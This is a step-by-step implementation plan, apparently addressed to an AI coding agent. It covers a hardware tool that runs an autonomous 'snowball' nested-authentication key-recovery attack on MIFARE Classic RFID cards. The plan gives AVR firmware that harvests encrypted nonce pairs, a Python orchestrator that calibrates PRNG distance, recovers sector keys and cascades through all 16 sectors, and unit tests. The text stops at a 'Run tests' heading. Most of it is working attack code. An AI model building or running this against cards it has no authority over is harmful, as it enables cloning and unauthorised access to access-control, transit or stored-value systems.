# Snowball Attack Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build an autonomous, feedback-driven key recovery system that cascades through all 16 MIFARE Classic sectors using a conversational firmware protocol and live dashboard.

**Architecture:** Replace the batch `N` command with four micro-commands (`NA`/`NP`/`NH`/`NX`) that let the Python GUI steer each step. A `SnowballOrchestrator` autonomously cascades: calibrate PRNG distance, collect nonces, recover key, use new key to attack more sectors. A live sector-map dashboard shows real-time progress.

**Tech Stack:** AVR C (ATmega328P, PlatformIO), Python 3 (CustomTkinter GUI), existing crapto1 C tools (nested.exe, mfkey32.exe)

**Design Doc:** `docs/plans/2026-03-01-snowball-attack-design.md`

---

## Task 1: Firmware — Add Conversational Nested Mode & Commands

**Files:**
- Modify: `src/main.c` (add MODE_NESTED_CONV, persistent state, command handlers, line-buffered parser)
- No test file (hardware firmware — tested on real hardware)

**Context:** The firmware currently has `MODE_NESTED` which auto-runs 50 rounds of `do_nested_collect()`. We add `MODE_NESTED_CONV` (mode 7) where the firmware waits for individual `NA`, `NP`, `NH`, `NX` commands and executes them one at a time. The existing `MODE_NESTED` and `do_nested_collect()` stay untouched for backward compatibility.

### Step 1: Add mode constant and persistent state variables

Add after the existing `#define MODE_NESTED 6` line (around line 16):

```c
#define MODE_NESTED_CONV 7
```

Add after the existing `static uint8_t nested_key[6];` (around line 471):

```c
// Persistent conversational nested session state
static uint8_t  conv_authed = 0;           // 0=idle, 1=authenticated
static crypto1_state conv_cs;              // LFSR state after auth
static uint8_t  conv_uid[4];               // UID from last auth (4 bytes, no BCC)
static uint8_t  conv_nt[4];                // nonce from last auth
static uint8_t  conv_auth_block;           // block we authenticated to
// Line buffer for conversational nested commands
static char     conv_buf[32];
static uint8_t  conv_buf_pos = 0;
```

### Step 2: Add the `cmd_na()` handler function

Add this function before `do_nested_collect()` (around line 734). This handles `NA:<block_hex>:<key_hex>:<A|B>` — authenticate to a sector using software crypto1.

```c
// Handle NA (Nested Auth) command
// Format: NA:<block_hex>:<key_12hex>:<A|B>
// Example: NA:00:FFFFFFFFFFFF:B
static void cmd_na(const char *args) {
    // Parse block (2 hex chars)
    uint8_t block = parse_hex_byte(args);
    if (args[2] != ':') { uart_puts("NA:ERR:PARSE\r\n"); return; }

    // Parse key (12 hex chars)
    uint8_t key[6];
    const char *kp = args + 3;
    for (uint8_t i = 0; i < 6; i++) {
        key[i] = parse_hex_byte(kp + i * 2);
    }
    if (kp[12] != ':') { uart_puts("NA:ERR:PARSE\r\n"); return; }

    // Parse key type
    char kt = kp[13];
    uint8_t auth_type;
    if (kt == 'A') auth_type = PICC_AUTHKA;
    else if (kt == 'B') auth_type = PICC_AUTHKB;
    else { uart_puts("NA:ERR:KEYTYPE\r\n"); return; }

    // If already authed, halt first (auto-cleanup)
    if (conv_authed) {
        mfrc522_halt();
        conv_authed = 0;
    }

    // Perform software auth
    uint8_t status = manual_auth(block, key, conv_uid, conv_nt, &conv_cs,
                                  auth_type, 250);
    if (status == MI_OK) {
        conv_authed = 1;
        conv_auth_block = block;
        uart_puts("NA:OK:");
        for (uint8_t i = 0; i < 4; i++) uart_put_hex(conv_uid[i]);
        uart_putc(':');
        for (uint8_t i = 0; i < 4; i++) uart_put_hex(conv_nt[i]);
        uart_puts("\r\n");
    } else {
        conv_authed = 0;
        uart_puts("NA:FAIL\r\n");
    }
}
```

**Important:** `NA:OK` also sends the UID and nonce (needed by GUI for calibration/recovery). Format: `NA:OK:<uid_hex>:<nt_hex>`.

### Step 3: Add the `cmd_np()` handler function

Add after `cmd_na()`. This handles `NP:<target_block_hex>` — probe a target block for a nonce pair.

```c
// Handle NP (Nested Probe) command
// Format: NP:<target_block_hex>
// Example: NP:14
static void cmd_np(const char *args) {
    if (!conv_authed) {
        uart_puts("NP:ERR:NOAUTH\r\n");
        return;
    }

    uint8_t target_block = parse_hex_byte(args);

    // Build encrypted AUTH command for target block
    uint8_t auth_cmd[4];
    auth_cmd[0] = PICC_AUTHKA;
    auth_cmd[1] = target_block;
    mfrc522_calculate_crc(auth_cmd, 2, &auth_cmd[2]);

    // Encrypt byte-by-byte with parity clocking
    uint8_t enc_cmd[4];
    uint8_t parity_ok = 1;
    for (uint8_t i = 0; i < 4; i++) {
        uint8_t ks = crypto1_byte(&conv_cs, auth_cmd[i], 0);
        enc_cmd[i] = auth_cmd[i] ^ ks;
        uint8_t wire_par = odd_parity8(enc_cmd[i]);
        uint8_t ks_par = crypto1_bit(&conv_cs, wire_par, 1);
        if (odd_parity8(ks) != ks_par) {
            parity_ok = 0;
            break;
        }
    }

    if (!parity_ok) {
        // Auto-parity won't match crypto parity — must re-auth
        mfrc522_halt();
        conv_authed = 0;
        uart_puts("NP:RETRY\r\n");
        return;
    }

    // Send encrypted auth command
    mfrc522_clear_bit(TxModeReg, 0x80);
    mfrc522_clear_bit(RxModeReg, 0x80);

    uint8_t nt_target[4];
    uint8_t back_len;
    uint8_t status = mfrc522_to_card(PCD_Transceive, enc_cmd, 4,
                                      nt_target, &back_len);

    mfrc522_set_bit(TxModeReg, 0x80);
    mfrc522_set_bit(RxModeReg, 0x80);

    if (status != MI_OK || back_len != 32) {
        mfrc522_halt();
        conv_authed = 0;
        uart_puts("NP:RETRY\r\n");
        return;
    }

    // Success! Send nonce pair
    uart_puts("NP:NT:");
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(conv_nt[i]);
    uart_putc(':');
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_target[i]);
    uart_puts("\r\n");

    // Session consumed — card needs re-auth
    mfrc522_halt();
    conv_authed = 0;
}
```

### Step 4: Add `cmd_nh()` and `cmd_nx()` handlers

Add after `cmd_np()`:

```c
// Handle NH (Nested Halt) command — halt card, end session
static void cmd_nh(void) {
    if (conv_authed) {
        mfrc522_halt();
        conv_authed = 0;
    }
    uart_puts("NH:OK\r\n");
}

// Handle NX (Nested Abort) command — emergency stop
static void cmd_nx(void) {
    mfrc522_halt();
    conv_authed = 0;
    conv_buf_pos = 0;
    uart_puts("NX:OK\r\n");
}
```

### Step 5: Add conversational nested mode entry point in command switch

In the main loop's command switch (around line 906, after the `case 'N':` block), add a new command entry. We'll use `'C'` (for Conversational) to enter the mode:

```c
                case 'C':
                    // Enter conversational nested mode
                    conv_authed = 0;
                    conv_buf_pos = 0;
                    scan_mode = MODE_NESTED_CONV;
                    uart_puts("OK:CONV_START\r\n");
                    break;
```

### Step 6: Add the MODE_NESTED_CONV handler in the main loop

Add after the `MODE_NESTED` block (around line 969), before the `MODE_IDLE` check:

```c
        if (scan_mode == MODE_NESTED_CONV) {
            if (uart_available()) {
                char c = uart_getc();
                if (c == '\r' || c == '\n') {
                    if (conv_buf_pos > 0) {
                        conv_buf[conv_buf_pos] = '\0';
                        // Parse and dispatch command
                        if (conv_buf[0] == 'N' && conv_buf[1] == 'A' &&
                            conv_buf[2] == ':' && conv_buf_pos >= 18) {
                            cmd_na(conv_buf + 3);
                        } else if (conv_buf[0] == 'N' && conv_buf[1] == 'P' &&
                                   conv_buf[2] == ':' && conv_buf_pos >= 5) {
                            cmd_np(conv_buf + 3);
                        } else if (conv_buf[0] == 'N' && conv_buf[1] == 'H') {
                            cmd_nh();
                        } else if (conv_buf[0] == 'N' && conv_buf[1] == 'X') {
                            cmd_nx();
                            scan_mode = MODE_IDLE;
                        } else {
                            uart_puts("ERR:UNKNOWN_CMD\r\n");
                        }
                        conv_buf_pos = 0;
                    }
                } else if (conv_buf_pos < sizeof(conv_buf) - 1) {
                    conv_buf[conv_buf_pos++] = c;
                }
            }
            _delay_ms(1);
            continue;
        }
```

### Step 7: Update serial_handler send_command to add newline for conversational mode

The conversational mode needs newline-terminated commands. The existing `send_command` doesn't append `\n`. This is fine because we'll handle this in the orchestrator's send method. No firmware change needed — just note that all `NA:`, `NP:`, `NH`, `NX` commands from the GUI must be newline-terminated.

### Step 8: Build the firmware

Run: `cd "Projects/RFID Card Reader" && pio run -e uno`
Expected: Build succeeds with no errors. Flash size should stay under 32KB.

### Step 9: Commit

```bash
git add src/main.c
git commit -m "feat(firmware): add conversational nested protocol (NA/NP/NH/NX)"
```

---

## Task 2: Serial Handler — Parse Conversational Nested Responses

**Files:**
- Modify: `gui/serial_handler.py` (add parsing for NA:, NP:, NH:, NX: responses)
- Test: `gui/tests/test_serial_handler.py` (add tests for new message types)

**Context:** The serial handler's `parse_line()` currently handles `TAG:`, `DATA:`, `DARK:`, `NESTED:`, `OK:`, `ERR:`, `INFO:` prefixes. We add parsing for the new conversational nested responses and also add a `send_conv_command()` method that appends `\n`.

### Step 1: Write the failing tests

Add to `gui/tests/test_serial_handler.py`:

```python
from serial_handler import SerialHandler


def test_parse_na_ok():
    msg = SerialHandler.parse_line("NA:OK:E413B3DA:A9770B9F")
    assert msg == {
        "type": "NA", "subtype": "OK",
        "uid": "E413B3DA", "nt": "A9770B9F",
    }


def test_parse_na_fail():
    msg = SerialHandler.parse_line("NA:FAIL")
    assert msg == {"type": "NA", "subtype": "FAIL"}


def test_parse_na_err():
    msg = SerialHandler.parse_line("NA:ERR:PARSE")
    assert msg == {"type": "NA", "subtype": "ERR", "reason": "PARSE"}


def test_parse_np_nt():
    msg = SerialHandler.parse_line("NP:NT:01020304:AABBCCDD")
    assert msg == {
        "type": "NP", "subtype": "NT",
        "nt_known": "01020304", "nt_target": "AABBCCDD",
    }


def test_parse_np_retry():
    msg = SerialHandler.parse_line("NP:RETRY")
    assert msg == {"type": "NP", "subtype": "RETRY"}


def test_parse_np_err():
    msg = SerialHandler.parse_line("NP:ERR:NOAUTH")
    assert msg == {"type": "NP", "subtype": "ERR", "reason": "NOAUTH"}


def test_parse_nh_ok():
    msg = SerialHandler.parse_line("NH:OK")
    assert msg == {"type": "NH", "subtype": "OK"}


def test_parse_nx_ok():
    msg = SerialHandler.parse_line("NX:OK")
    assert msg == {"type": "NX", "subtype": "OK"}


def test_parse_conv_start():
    msg = SerialHandler.parse_line("OK:CONV_START")
    assert msg == {"type": "OK", "message": "CONV_START"}
```

### Step 2: Run tests to verify they fail

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_serial_handler.py -v`
Expected: New tests FAIL (parse_line returns `None` for unknown prefixes)

### Step 3: Add parsing logic to serial_handler.py

In `parse_line()`, add these blocks after the `NESTED:` block (around line 134) and before the `OK:/ERR:/INFO:` block:

```python
        elif line.startswith("NA:"):
            parts = line[3:].split(":")
            if parts[0] == "OK" and len(parts) >= 3:
                return {
                    "type": "NA", "subtype": "OK",
                    "uid": parts[1], "nt": parts[2],
                }
            elif parts[0] == "FAIL":
                return {"type": "NA", "subtype": "FAIL"}
            elif parts[0] == "ERR" and len(parts) >= 2:
                return {"type": "NA", "subtype": "ERR", "reason": parts[1]}
        elif line.startswith("NP:"):
            parts = line[3:].split(":")
            if parts[0] == "NT" and len(parts) >= 3:
                return {
                    "type": "NP", "subtype": "NT",
                    "nt_known": parts[1], "nt_target": parts[2],
                }
            elif parts[0] == "RETRY":
                return {"type": "NP", "subtype": "RETRY"}
            elif parts[0] == "ERR" and len(parts) >= 2:
                return {"type": "NP", "subtype": "ERR", "reason": parts[1]}
        elif line.startswith("NH:"):
            return {"type": "NH", "subtype": line[3:]}
        elif line.startswith("NX:"):
            return {"type": "NX", "subtype": line[3:]}
```

Also add a `send_conv_command()` method to the `SerialHandler` class:

```python
    def send_conv_command(self, cmd):
        """Send a newline-terminated command for conversational nested mode."""
        with self._lock:
            if self.ser and self.ser.is_open:
                self.ser.write((cmd + "\n").encode())
```

### Step 4: Run tests to verify they pass

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_serial_handler.py -v`
Expected: ALL tests pass

### Step 5: Commit

```bash
git add gui/serial_handler.py gui/tests/test_serial_handler.py
git commit -m "feat(gui): parse conversational nested responses (NA/NP/NH/NX)"
```

---

## Task 3: Snowball Orchestrator — Core State Machine

**Files:**
- Create: `gui/snowball.py`
- Test: `gui/tests/test_snowball.py`

**Context:** This is the brain of the system. `SnowballOrchestrator` maintains a known-keys map, picks targets, sends micro-commands, and drives the feedback loop. It emits events to a `result_queue` for the GUI. This task covers the core state machine without key recovery integration (Task 5 adds that).

### Step 1: Write the failing tests for initialization and start

Create `gui/tests/test_snowball.py`:

```python
import queue
from snowball import SnowballOrchestrator


class FakeSerial:
    def __init__(self):
        self.commands = []

    def send_conv_command(self, cmd):
        self.commands.append(cmd)

    def send_command(self, cmd):
        self.commands.append(cmd)


def test_init():
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    assert orch.state == "idle"
    assert orch.known_keys == {}
    assert orch.uid == 0xE413B3DA


def test_start_enters_conv_mode():
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    # Should send 'C' to enter conversational mode
    assert serial.commands[0] == "C"
    assert orch.state == "starting"
    assert 0 in orch.known_keys
    assert orch.known_keys[0] == (bytes.fromhex("FFFFFFFFFFFF"), "B")


def test_start_builds_target_queue():
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    # All sectors except 0 should be in target queue
    assert 0 not in orch.target_queue
    assert len(orch.target_queue) == 15
```

### Step 2: Run tests to verify they fail

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_snowball.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'snowball'`

### Step 3: Create the snowball module with init and start

Create `gui/snowball.py`:

```python
"""
Snowball attack orchestrator for MIFARE Classic.

Autonomously cascades through all 16 sectors using a conversational
firmware protocol. Each cracked key becomes leverage for the next.
"""

import queue
import time

from key_recovery import calibrate_nested_distance, nested_recover


class SnowballStats:
    """Track timing and progress for the live dashboard."""

    def __init__(self):
        self.start_time = 0.0
        self.sectors_cracked = 0
        self.sectors_failed = 0
        self.total_nonces = 0
        self.total_retries = 0
        self.current_phase = "idle"
        self.current_nonce_count = 0
        self.last_key_found = None
        self.per_sector_times = []


class SnowballOrchestrator:
    """Autonomous cascading key recovery for all card sectors."""

    # Tuning constants
    MIN_NONCES_FOR_RECOVERY = 2
    MAX_NONCES_PER_TARGET = 10
    MAX_RETRIES_PER_NONCE = 20  # re-auths before giving up on one nonce
    MAX_RECOVERY_ATTEMPTS = 3

    def __init__(self, serial_handler, uid: int):
        self.serial = serial_handler
        self.uid = uid
        self.state = "idle"
        self.known_keys: dict[int, tuple[bytes, str]] = {}
        self.target_queue: list[int] = []
        self.current_target: int | None = None
        self.current_source: int | None = None
        self.nonce_pairs: list[tuple[int, int]] = []
        self.calibrated_distance: int | None = None
        self.result_queue: queue.Queue = queue.Queue()
        self.stats = SnowballStats()
        self._retry_count = 0
        self._recovery_attempts = 0
        self._sector_start_time = 0.0
        # Calibration state
        self._calib_source: int | None = None
        self._calib_target: int | None = None
        self._calib_key: bytes | None = None
        self._calib_key_type: str | None = None
        self._calib_nonces: list[tuple[int, int]] = []

    def start(self, seed_sector: int, seed_key: bytes, seed_key_type: str):
        """Begin snowball from a known key."""
        self.known_keys[seed_sector] = (seed_key, seed_key_type)
        self.target_queue = [s for s in range(16) if s != seed_sector]
        self.stats = SnowballStats()
        self.stats.start_time = time.monotonic()
        self.state = "starting"
        # Enter conversational nested mode
        self.serial.send_command("C")
        self.result_queue.put({
            "event": "snowball_started",
            "seed_sector": seed_sector,
            "total_unknown": len(self.target_queue),
        })

    def stop(self):
        """Abort the snowball attack."""
        self._send("NX")
        self.state = "idle"
        self.stats.current_phase = "stopped"
        self.result_queue.put({
            "event": "snowball_stopped",
            "sectors_cracked": self.stats.sectors_cracked,
            "keys": dict(self.known_keys),
        })

    def feed(self, msg: dict):
        """Process a parsed serial message, advance state machine."""
        msg_type = msg.get("type")

        if self.state == "starting":
            if msg_type == "OK" and msg.get("message") == "CONV_START":
                self._begin_next_sector()
            return

        if self.state == "calibrating":
            self._handle_calibrating(msg)
        elif self.state == "collecting":
            self._handle_collecting(msg)

    def _send(self, cmd):
        """Send a newline-terminated conversational command."""
        self.serial.send_conv_command(cmd)

    def _pick_next_target(self) -> int | None:
        """Pick the next sector to attack. Prefer adjacent to known sectors."""
        if not self.target_queue:
            return None
        best = None
        best_dist = 999
        for t in self.target_queue:
            for k in self.known_keys:
                d = abs(t - k)
                if d < best_dist:
                    best_dist = d
                    best = t
        return best

    def _pick_best_source(self, target: int) -> int:
        """Pick the known sector closest to the target."""
        return min(self.known_keys.keys(), key=lambda k: abs(k - target))

    def _find_calib_target(self, source: int) -> int | None:
        """Find a second known sector to calibrate against (not source itself)."""
        for s in self.known_keys:
            if s != source:
                return s
        return None

    def _begin_next_sector(self):
        """Pick a target and start calibration."""
        target = self._pick_next_target()
        if target is None:
            self._finish_snowball()
            return

        source = self._pick_best_source(target)
        calib_target = self._find_calib_target(source)

        self.current_target = target
        self.current_source = source
        self.nonce_pairs = []
        self._retry_count = 0
        self._recovery_attempts = 0
        self._sector_start_time = time.monotonic()
        self.stats.current_nonce_count = 0

        if calib_target is not None:
            # Calibrate: auth to source, probe calib_target
            self._calib_source = source
            self._calib_target = calib_target
            key, kt = self.known_keys[source]
            self._calib_key = key
            self._calib_key_type = kt
            self._calib_nonces = []
            self.state = "calibrating"
            self.stats.current_phase = "calibrating"
            self.result_queue.put({
                "event": "sector_calibrating",
                "source": source,
                "target": target,
            })
            block = source * 4
            key_hex = key.hex().upper()
            self._send(f"NA:{block:02X}:{key_hex}:{kt}")
        else:
            # Only one known sector — skip calibration, use default distance
            self.calibrated_distance = 160  # reasonable default
            self._begin_collection()

    def _begin_collection(self):
        """Start collecting nonces for the current target."""
        self.state = "collecting"
        self.stats.current_phase = "collecting"
        self._retry_count = 0
        self.result_queue.put({
            "event": "sector_collecting",
            "target": self.current_target,
            "nonce_count": 0,
        })
        # Auth to source sector
        source = self.current_source
        key, kt = self.known_keys[source]
        block = source * 4
        key_hex = key.hex().upper()
        self._send(f"NA:{block:02X}:{key_hex}:{kt}")

    def _handle_calibrating(self, msg):
        """Handle messages during calibration phase."""
        msg_type = msg.get("type")

        if msg_type == "NA":
            if msg.get("subtype") == "OK":
                # Authenticated — probe the calibration target
                calib_block = self._calib_target * 4
                self._send(f"NP:{calib_block:02X}")
            elif msg.get("subtype") in ("FAIL", "ERR"):
                # Auth failed — try next sector or fail
                self._retry_count += 1
                if self._retry_count < 5:
                    source = self._calib_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("auth_failed")

        elif msg_type == "NP":
            if msg.get("subtype") == "NT":
                nt_known = int(msg["nt_known"], 16)
                nt_target = int(msg["nt_target"], 16)
                self._calib_nonces.append((nt_known, nt_target))

                if len(self._calib_nonces) >= 3:
                    self._finish_calibration()
                else:
                    # Need more — re-auth and probe again
                    self._retry_count = 0
                    source = self._calib_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")

            elif msg.get("subtype") == "RETRY":
                self.stats.total_retries += 1
                self._retry_count += 1
                if self._retry_count < self.MAX_RETRIES_PER_NONCE:
                    source = self._calib_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("calibration_timeout")

    def _finish_calibration(self):
        """Compute PRNG distance from calibration nonces."""
        distances = []
        for nt_k, nt_t in self._calib_nonces:
            d = calibrate_nested_distance(
                self.uid, nt_k, nt_t, self._calib_key, max_dist=65536
            )
            if d is not None:
                distances.append(d)

        if not distances:
            self._sector_failed("calibration_no_distance")
            return

        self.calibrated_distance = max(set(distances), key=distances.count)
        self.result_queue.put({
            "event": "sector_calibrated",
            "distance": self.calibrated_distance,
            "samples": len(distances),
        })
        self._begin_collection()

    def _handle_collecting(self, msg):
        """Handle messages during nonce collection phase."""
        msg_type = msg.get("type")

        if msg_type == "NA":
            if msg.get("subtype") == "OK":
                # Authenticated — probe the target
                target_block = self.current_target * 4
                self._send(f"NP:{target_block:02X}")
            elif msg.get("subtype") in ("FAIL", "ERR"):
                self._retry_count += 1
                if self._retry_count < 5:
                    source = self.current_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("auth_failed")

        elif msg_type == "NP":
            if msg.get("subtype") == "NT":
                nt_known = int(msg["nt_known"], 16)
                nt_target = int(msg["nt_target"], 16)
                self.nonce_pairs.append((nt_known, nt_target))
                self.stats.total_nonces += 1
                self.stats.current_nonce_count = len(self.nonce_pairs)
                self._retry_count = 0

                self.result_queue.put({
                    "event": "sector_collecting",
                    "target": self.current_target,
                    "nonce_count": len(self.nonce_pairs),
                })

                if len(self.nonce_pairs) >= self.MIN_NONCES_FOR_RECOVERY:
                    self._attempt_recovery()
                else:
                    # Need more nonces — re-auth and probe again
                    source = self.current_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")

            elif msg.get("subtype") == "RETRY":
                self.stats.total_retries += 1
                self._retry_count += 1
                if self._retry_count < self.MAX_RETRIES_PER_NONCE:
                    source = self.current_source
                    key, kt = self.known_keys[source]
                    block = source * 4
                    key_hex = key.hex().upper()
                    self._send(f"NA:{block:02X}:{key_hex}:{kt}")
                else:
                    self._sector_failed("collection_timeout")

    def _attempt_recovery(self):
        """Try to recover the key from collected nonces."""
        self._recovery_attempts += 1
        self.stats.current_phase = "recovering"
        self.result_queue.put({
            "event": "sector_recovering",
            "target": self.current_target,
            "nonce_count": len(self.nonce_pairs),
        })

        candidates = nested_recover(
            self.uid, self.calibrated_distance, self.nonce_pairs
        )

        if candidates:
            # Key found!
            key = candidates[0]
            elapsed = time.monotonic() - self._sector_start_time
            sector = self.current_target

            # Determine key type (try A first, then B — we'll store whatever works)
            # For now, store as "A" — the GUI can verify later
            self.known_keys[sector] = (key, "A")
            if sector in self.target_queue:
                self.target_queue.remove(sector)

            self.stats.sectors_cracked += 1
            self.stats.last_key_found = key.hex().upper()
            self.stats.per_sector_times.append(elapsed)

            self.result_queue.put({
                "event": "sector_cracked",
                "sector": sector,
                "key": key.hex().upper(),
                "key_type": "A",
                "time_taken": elapsed,
            })

            # Snowball: attack next sector
            self._begin_next_sector()
        else:
            # Recovery failed — collect more nonces or give up
            if (len(self.nonce_pairs) < self.MAX_NONCES_PER_TARGET and
                    self._recovery_attempts < self.MAX_RECOVERY_ATTEMPTS):
                self.stats.current_phase = "collecting"
                source = self.current_source
                key, kt = self.known_keys[source]
                block = source * 4
                key_hex = key.hex().upper()
                self._send(f"NA:{block:02X}:{key_hex}:{kt}")
            else:
                self._sector_failed("recovery_failed")

    def _sector_failed(self, reason: str):
        """Mark current sector as failed and move on."""
        sector = self.current_target
        if sector in self.target_queue:
            self.target_queue.remove(sector)
        self.stats.sectors_failed += 1

        self.result_queue.put({
            "event": "sector_failed",
            "sector": sector,
            "reason": reason,
        })

        self._begin_next_sector()

    def _finish_snowball(self):
        """All targets attempted."""
        elapsed = time.monotonic() - self.stats.start_time
        self.state = "done"
        self.stats.current_phase = "done"

        self._send("NX")  # Exit conversational mode

        self.result_queue.put({
            "event": "snowball_complete",
            "total_cracked": self.stats.sectors_cracked,
            "total_failed": self.stats.sectors_failed,
            "total_time": elapsed,
            "keys": {s: (k.hex().upper(), kt) for s, (k, kt) in self.known_keys.items()},
        })
```

### Step 4: Run tests to verify they pass

Run: `cd "Projects/RFID Card Reader/gui" && python -m pytest tests/test_snowball.py -v`
Expected: All 3 tests pass

### Step 5: Commit

```bash
git add gui/snowball.py gui/tests/test_snowball.py
git commit -m "feat(gui): add SnowballOrchestrator core state machine"
```

---

## Task 4: Snowball Orchestrator — State Machine Tests

**Files:**
- Modify: `gui/tests/test_snowball.py` (add comprehensive state machine tests)

**Context:** Now we test the full feedback loop: feed simulated firmware responses and verify the orchestrator transitions through states correctly, sends the right commands, and emits the right events.

### Step 1: Write state machine tests

Add to `gui/tests/test_snowball.py`:

```python
def test_conv_start_triggers_calibration():
    """After CONV_START, orchestrator starts calibrating."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    # Need 2 known sectors for calibration
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    # Add a second known key to enable calibration
    orch.known_keys[1] = (bytes.fromhex("FFFFFFFFFFFF"), "B")
    orch.target_queue = [s for s in range(2, 16)]

    orch.feed({"type": "OK", "message": "CONV_START"})
    assert orch.state == "calibrating"
    # Should have sent NA command for source sector
    assert any("NA:" in cmd for cmd in serial.commands)


def test_single_known_sector_skips_calibration():
    """With only one known sector, skip calibration and use default distance."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")

    orch.feed({"type": "OK", "message": "CONV_START"})
    # Should skip to collecting (default distance)
    assert orch.state == "collecting"
    assert orch.calibrated_distance == 160


def test_na_ok_triggers_np():
    """After NA:OK, orchestrator sends NP to probe target."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    orch.feed({"type": "OK", "message": "CONV_START"})
    assert orch.state == "collecting"

    # Clear commands, feed NA:OK
    serial.commands.clear()
    orch.feed({"type": "NA", "subtype": "OK",
               "uid": "E413B3DA", "nt": "01020304"})
    # Should send NP for target block
    np_cmds = [c for c in serial.commands if c.startswith("NP:")]
    assert len(np_cmds) == 1


def test_np_retry_re_auths():
    """After NP:RETRY, orchestrator re-authenticates."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    orch.feed({"type": "OK", "message": "CONV_START"})

    # Get into collecting state, simulate auth success then retry
    orch.feed({"type": "NA", "subtype": "OK",
               "uid": "E413B3DA", "nt": "01020304"})
    serial.commands.clear()
    orch.feed({"type": "NP", "subtype": "RETRY"})

    # Should re-auth (send NA again)
    na_cmds = [c for c in serial.commands if c.startswith("NA:")]
    assert len(na_cmds) == 1


def test_np_nt_collects_nonce():
    """After NP:NT, orchestrator stores the nonce pair."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    orch.calibrated_distance = 160
    orch.feed({"type": "OK", "message": "CONV_START"})
    orch.feed({"type": "NA", "subtype": "OK",
               "uid": "E413B3DA", "nt": "01020304"})

    orch.feed({"type": "NP", "subtype": "NT",
               "nt_known": "01020304", "nt_target": "AABBCCDD"})

    assert len(orch.nonce_pairs) == 1
    assert orch.nonce_pairs[0] == (0x01020304, 0xAABBCCDD)


def test_sector_failed_moves_to_next():
    """After sector fails, orchestrator picks next target."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    orch.feed({"type": "OK", "message": "CONV_START"})

    first_target = orch.current_target
    # Simulate enough NA failures to trigger sector_failed
    for _ in range(5):
        orch.feed({"type": "NA", "subtype": "FAIL"})

    # Should have moved to a new target
    assert orch.current_target != first_target or orch.state == "done"
    # First target removed from queue
    assert first_target not in orch.target_queue


def test_all_sectors_done_completes():
    """When all targets are exhausted, snowball completes."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    # Clear target queue to simulate all done
    orch.target_queue = []
    orch.feed({"type": "OK", "message": "CONV_START"})

    assert orch.state == "done"
    # Should emit snowball_complete event
    events = []
    while not orch.result_queue.empty():
        events.append(orch.result_queue.get_nowait())
    assert any(e["event"] == "snowball_complete" for e in events)


def test_pick_next_target_prefers_adjacent():
    """Target picker prefers sectors adjacent to known sectors."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.known_keys = {0: (b"\xff" * 6, "B"), 5: (b"\xaa" * 6, "A")}
    orch.target_queue = [3, 4, 6, 10, 15]
    # Sector 4 is distance 1 from sector 5, and sector 6 is distance 1 from 5
    # Either 4 or 6 should be picked (both distance 1)
    target = orch._pick_next_target()
    assert target in (4, 6)


def test_pick_best_source():
    """Source picker selects the closest known sector."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.known_keys = {0: (b"\xff" * 6, "B"), 5: (b"\xaa" * 6, "A")}
    assert orch._pick_best_source(4) == 5
    assert orch._pick_best_source(1) == 0
    assert orch._pick_best_source(3) in (0, 5)  # equidistant, either ok


def test_stop_sends_nx():
    """Stop sends NX and goes idle."""
    serial = FakeSerial()
    orch = SnowballOrchestrator(serial, uid=0xE413B3DA)
    orch.start(seed_sector=0, seed_key=bytes.fromhex("FFFFFFFFFFFF"),
               seed_key_type="B")
    orch.stop()
    assert orch.state == "idle"
    assert any("NX" in cmd for cmd in serial.commands)
```

### Step 2: Run tests

